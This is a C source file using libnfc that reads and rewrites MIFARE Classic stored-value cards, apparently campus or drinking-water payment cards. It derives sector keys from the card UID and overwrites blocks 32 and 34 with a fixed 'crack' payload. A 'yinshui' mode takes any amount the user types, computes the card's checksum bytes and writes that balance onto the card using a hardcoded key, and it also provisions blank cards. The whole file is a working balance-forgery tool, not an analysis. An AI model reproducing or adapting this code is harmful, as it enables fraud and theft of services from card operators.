/*
#if defined(HAVE_CONFIG_H)
    #include "config.h"
#endif
*/


#include <stdlib.h>
#include<string.h>
#include <stdio.h>
#include <nfc/nfc.h>
#include <unistd.h>
#include "mifare.c"
#include "de_money.h"


static mifare_param mp;
static nfc_device *pnd;
static nfc_target nt;
static nfc_context *context;
static mifare_cmd mc;
static uint8_t uid[4];
static uint8_t key[6];

const nfc_modulation nmMifare = {
    .nmt = NMT_ISO14443A,
    .nbr = NBR_106,
};

void
print_hex(const uint8_t *pbtData, const size_t szBytes)
{
  size_t  szPos;

  for (szPos = 0; szPos < szBytes; szPos++) {
    printf("%02x  ", pbtData[szPos]);
  }
  printf("\n");
}



void init(void){
    nfc_init(&context);
    if (context == NULL) {
	printf("libnfc初始化失败！\n");
	exit(EXIT_FAILURE);
    }
    
    pnd = nfc_open(context, NULL); 
    if (pnd == NULL) {
	printf("错误: %s\n", "你确定插好读卡器了？");
	exit(EXIT_FAILURE);
    }
    
    if (nfc_initiator_init(pnd) < 0) {
	nfc_perror(pnd, "nfc_initiator_init");
	exit(EXIT_FAILURE);
    }
 
    printf("NFC 读卡器: %s 已打开\n", nfc_device_get_name(pnd));
}

void read_and_crack(void){ 
    printf("\n寻找卡片中...\n");
    while(nfc_initiator_select_passive_target(pnd, nmMifare, NULL, 0, &nt)<=0){}
    memcpy(uid,nt.nti.nai.abtUid,4);
    //aeny(mp.mpa.abtAuthUid, nt.nti.nai.abtUid + nt.nti.nai.szUidLen - 4, 4);
    printf("找到卡片！UID = ");
    print_hex(uid,4);
    memcpy(mp.mpa.abtAuthUid,uid,4);
    //生成key
    key[0]=0xab;
    for(int i=1;i<5;i++){
	key[i]=uid[i-1];
    }
    key[5]=0x0b;
    mc = MC_AUTH_A;    
    //memcpy(mp.mpa.abtKey, key,6);
    //uint8_t *temp;
    memcpy(mp.mpa.abtKey, key,6);
    uint32_t block=32;		//应读取block 32 和 block 34
    if(!nfc_initiator_mifare_cmd(pnd, mc, block, &mp)){
    	printf("密钥验证错误！\n");
    }else{
    	printf("成功验证密钥！\n");
    	mc = MC_READ;
	if(nfc_initiator_mifare_cmd(pnd, mc, block, &mp)){
		printf("读取到的数据：\n");
		print_hex(mp.mpd.abtData,16);
		//putchar('\n');
		mc = MC_WRITE;
		uint8_t crack[16]={0x43,0x53,0x49,0x08,0x02,0xAC,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xFF,0x00,0xAE};
		memcpy(mp.mpd.abtData,crack,16);
		if(nfc_initiator_mifare_cmd(pnd, mc, block, &mp) && nfc_initiator_mifare_cmd(pnd, mc, block+2, &mp)){
			printf("修改成功！\n\n");
			sleep(1.5);
			read_and_crack();
		}else{
			printf("修改失败！\n\n");
		}

	}else{
		printf("读取失败！\n");
	}
    }
    
    }

void read_only(void){
    LOP1:    
    printf("\n寻找卡片中...\n");
    while(nfc_initiator_select_passive_target(pnd, nmMifare, NULL, 0, &nt)<=0){}
    memcpy(uid,nt.nti.nai.abtUid,4);
    //aeny(mp.mpa.abtAuthUid, nt.nti.nai.abtUid + nt.nti.nai.szUidLen - 4, 4);
    printf("找到卡片！UID = ");
    print_hex(uid,4);
    memcpy(mp.mpa.abtAuthUid,uid,4);
    //生成key
    key[0]=0xab;
    for(int i=1;i<5;i++){
	key[i]=uid[i-1];
    }
    key[5]=0x0b;
    mc = MC_AUTH_A;    
    //memcpy(mp.mpa.abtKey, key,6);
    //uint8_t *temp;
    memcpy(mp.mpa.abtKey, key,6);
    uint32_t block=32;		//应读取block 32 和 block 34
    if(!nfc_initiator_mifare_cmd(pnd, mc, block, &mp)){
    	printf("密钥验证错误！\n");
    }else{
    	printf("成功验证密钥！\n");
    	mc = MC_READ;
	if(nfc_initiator_mifare_cmd(pnd, mc, block, &mp)){
		printf("读取到的数据：\n");
		print_hex(mp.mpd.abtData,16);
		putchar('\n');
		sleep(1.5);
		read_only();
	}else{
		printf("读取失败！\n");
	}
    }
    
}

void yinshui(void){
    printf("请输入想要的金额：");
    float temp;
    scanf("%f",&temp);
    number_t *money;
    LOP2: money =number_init(temp*100);
    uint8_t money_data[3]={0,0,0};
    
    for (size_t i = 0; i < money->size; i++)
    {
        money_data[i]=money->data[i];
          
  }
    
     printf("\n寻找卡片中...\n");
    while(nfc_initiator_select_passive_target(pnd, nmMifare, NULL, 0, &nt)<=0){}
    memcpy(uid,nt.nti.nai.abtUid,4);
    printf("找到卡片！UID = ");
    print_hex(uid,4);
    memcpy(mp.mpa.abtAuthUid,uid,4);


    mc = MC_AUTH_A;
    char key[]={0x19,0x98,0x01,0x21,0x09,0x26};
    memcpy(mp.mpa.abtKey,key ,6);
    uint32_t block=56;	


    if(!nfc_initiator_mifare_cmd(pnd, mc, block, &mp)){
    	printf("密钥验证错误！\n");
        printf("可能是张新卡？正在尝试开卡。。。\n");
       // nfc_initiator_mifare_cmd(pnd,m)

       mifare_param mp2;
        uint8_t key_default[]={0xff,0xff,0xff,0xff,0xff,0xff}; //默认密码
        memcpy(mp2.mpa.abtAuthUid,uid,4);
        memcpy(mp2.mpt.abtKeyA,key_default,6);
        mc=MC_AUTH_A;
        if (!nfc_initiator_mifare_cmd(pnd, mc, block, &mp2)){
            printf("开卡失败！正在退出程序。。。\n");

        }else{
            printf("已确认此为新卡！\n");
            uint8_t data[4][16]={{0x81,0x15,0x12,0x34,0x56,0x78,0x00,0x01,0x65,0x27,0x00,0x00,0x00,0x00,0x00,0x00},{0x54,0x56,0x55,0x00,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff},{0x55,0x55,0x55,0x00,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff},{0x19,0x98,0x01,0x21,0x09,0x26,0xff,0x07,0x80,0x69,0xff,0xff,0xff,0xff,0xff,0xff}};
            //以上为默认数据
            
            mc=MC_WRITE;


            for (size_t i = 0; i < 4; i++){
                memcpy(mp.mpd.abtData,data[i],16);
                if (nfc_initiator_mifare_cmd(pnd,mc,block+i,&mp) )
                {
                    printf("第 %d 块已写入！\n",block);
                }else
                {
                    printf("第 %d 块写入失败！\n",block);
                    exit(EXIT_FAILURE);
                    break;
                }                          
                    
            }
            printf("开卡完成！\n");            
        }               


   } else{
        mc = MC_READ;
        if(nfc_initiator_mifare_cmd(pnd, mc, block+2, &mp)){
		printf("读取到的数据：\n");
		print_hex(mp.mpd.abtData,16);
		putchar('\n');

         uint8_t data[4][16]={{0x81,0x15,0x12,0x34,0x56,0x78,0x00,0x01,0x65,0x27,0x00,0x00,0x00,0x00,0x00,0x00},{0x54,0x56,0x55,0x00,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff},{0x55,0x55,0x55,0x00,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff},{0x19,0x98,0x01,0x21,0x09,0x26,0xff,0x07,0x80,0x69,0xff,0xff,0xff,0xff,0xff,0xff}};
       
       
        for (size_t i = 0; i < 3; )
        {
            data[2][(i+1)]=money_data[i];
            i++;
        }
        data[2][0]=(uint8_t)~(money_data[0]+money_data[1]+money_data[2]);
        money_data[0]+=1;
        for (size_t i = 0; i < 3; )
        {
            data[1][(i+1)]=money_data[i];
            i++;
        }
        data[1][0]=(uint8_t)~(money_data[0]+money_data[1]+money_data[2]);


        mc = MC_WRITE ;
        block++;
        for (size_t i = 0; i < 2; i++){
            memcpy(&mp.mpd.abtData,data[1+i],16);
            if(nfc_initiator_mifare_cmd(pnd, mc, block, &mp)){
                      printf("第 %d 块已写入！\n",block);
          }else
                {
                    printf("第 %d 块写入失败！\n",block);
                    break;
              }  
        block++;
        }
         mc = MC_READ;

         block=57;
         for (size_t i = 0; i < 2; i++){
            if(nfc_initiator_mifare_cmd(pnd, mc, block, &mp)){
            printf("第%d读取到的数据：\n",block);
            print_hex(mp.mpd.abtData,16);
            putchar('\n');
            }
            block++;

        }
		sleep(1.5);
        goto LOP2;
	}else{
		printf("读取失败！\n");
	}
    }
}

int main(void){
    init();
    printf("选择要进入的模式:\n	1.读取后修改		2.只读取不修改\n");
    int ch;
    scanf("%d",&ch);
    switch(ch){
	case 1 :read_and_crack();break;
	case 2 :read_only();break;
    case 3:yinshui();break;
	default :printf("错误输入！\n");
		exit(0);
    }

}
